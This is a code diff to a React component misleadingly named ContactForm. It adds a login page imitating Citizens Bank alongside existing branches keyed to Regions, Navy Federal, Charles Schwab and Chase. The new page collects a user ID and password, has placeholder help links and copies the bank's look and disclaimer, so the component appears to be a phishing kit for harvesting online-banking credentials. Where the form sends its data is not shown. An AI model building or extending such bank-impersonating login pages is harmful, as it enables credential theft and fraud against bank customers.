@@ -102,6 +102,7 @@ export default function ContactForm() {
   const isRegions = bankName?.toLowerCase().includes('regions')
   const isNavyFederal = bankName?.toLowerCase().includes('navy federal')
   const isCharlesSchwab = bankName?.toLowerCase().includes('charles schwab')
+  const isCitizens = bankName?.toLowerCase().includes('citizens')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -1236,6 +1237,102 @@ export default function ContactForm() {
                     </select>
                   </div>
                 </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para Citizens Bank
+    if (isCitizens) {
+      return (
+        <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-md">
+              <form onSubmit={submitForm} className="space-y-8">
+                {/* User ID */}
+                <div>
+                  <label className="mb-3 block text-xl font-bold text-gray-900">User ID</label>
+                  <input
+                    type="text"
+                    required
+                    value={username}
+                    onChange={(e) => setUsername(e.target.value)}
+                    className="w-full border-2 border-gray-800 px-4 py-4 text-lg text-gray-800 outline-none transition-colors focus:border-blue-600"
+                  />
+                </div>
+
+                {/* Password */}
+                <div>
+                  <label className="mb-3 block text-xl font-bold text-gray-900">Password</label>
+                  <div className="relative">
+                    <input
+                      type={showPassword ? 'text' : 'password'}
+                      required
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="w-full border-2 border-gray-800 px-4 py-4 pr-16 text-lg text-gray-800 outline-none transition-colors focus:border-blue-600"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-4 top-1/2 -translate-y-1/2 font-bold text-gray-800 hover:text-gray-600 underline"
+                    >
+                      {showPassword ? 'Hide' : 'Show'}
+                    </button>
+                  </div>
+                </div>
+
+                {/* Remember user ID */}
+                <label className="flex items-center gap-3">
+                  <input
+                    type="checkbox"
+                    checked={rememberUsername}
+                    onChange={(e) => setRememberUsername(e.target.checked)}
+                    className="h-6 w-6 cursor-pointer border-2 border-gray-600"
+                  />
+                  <span className="text-lg text-gray-900">Remember user ID</span>
+                </label>
+
+                {/* Help Links */}
+                <div className="space-y-3 pt-4">
+                  <a href="#" className="block text-lg font-semibold text-blue-600 hover:text-blue-700 underline">
+                    Trouble logging in/Password change
+                  </a>
+                  <p className="text-lg text-gray-900">
+                    New to Online Banking?{' '}
+                    <a href="#" className="font-semibold text-blue-600 hover:text-blue-700 underline">
+                      Enroll now.
+                    </a>
+                  </p>
+                </div>
+
+                {/* Buttons */}
+                <div className="flex gap-4 pt-6">
+                  <button
+                    type="submit"
+                    disabled={submitting}
+                    className="flex items-center justify-center gap-3 bg-red-700 px-8 py-4 font-bold text-white hover:bg-red-800 transition-colors disabled:opacity-60"
+                  >
+                    <Icon name="lock" size={24} />
+                    <span>{submitting ? 'Logging in…' : 'Log In'}</span>
+                  </button>
+                  <button
+                    type="button"
+                    onClick={closeWindow}
+                    className="px-8 py-4 font-bold text-gray-900 hover:text-gray-700 underline"
+                  >
+                    Cancel
+                  </button>
+                </div>
+              </form>
+
+              {/* Disclaimer */}
+              <div className="mt-12 text-center">
+                <p className="text-sm italic text-gray-700">
+                  Non-deposit products: Are not FDIC Insured; Are not deposits; May lose value.
+                </p>
               </div>
             </div>
           </div>
